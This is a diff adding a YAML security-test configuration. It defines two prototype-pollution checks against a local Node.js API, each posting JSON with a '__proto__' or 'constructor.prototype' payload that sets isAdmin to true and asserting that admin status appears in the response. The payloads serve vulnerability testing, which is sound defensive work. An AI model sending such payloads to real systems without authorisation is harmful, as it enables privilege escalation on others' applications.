@@ -1,0 +1,41 @@
+name: "Pollution de Prototype - Node.js / JavaScript"
+variables:
+  base_url: "http://localhost:8080"
+defaults:
+  read_timeout: 10
+  verify: false
+  follow_redirects: true
+
+tests:
+  - id: prototype-pollution-proto
+    name: "Pollution de Prototype via __proto__"
+    severity: high
+    request:
+      method: POST
+      path: "/api/user/preferences"
+      headers:
+        Content-Type: "application/json"
+      json:
+        __proto__:
+          isAdmin: true
+        theme: "dark"
+    assert:
+      - status: 200
+      - body_regex: "(?i)(isAdmin.*true|admin.*true)"
+
+  - id: prototype-pollution-constructor
+    name: "Pollution de Prototype via Constructor"
+    severity: high
+    request:
+      method: POST
+      path: "/api/user/preferences"
+      headers:
+        Content-Type: "application/json"
+      json:
+        constructor:
+          prototype:
+            isAdmin: true
+        theme: "dark"
+    assert:
+      - status: 200
+      - body_regex: "(?i)(isAdmin.*true|admin.*true)"
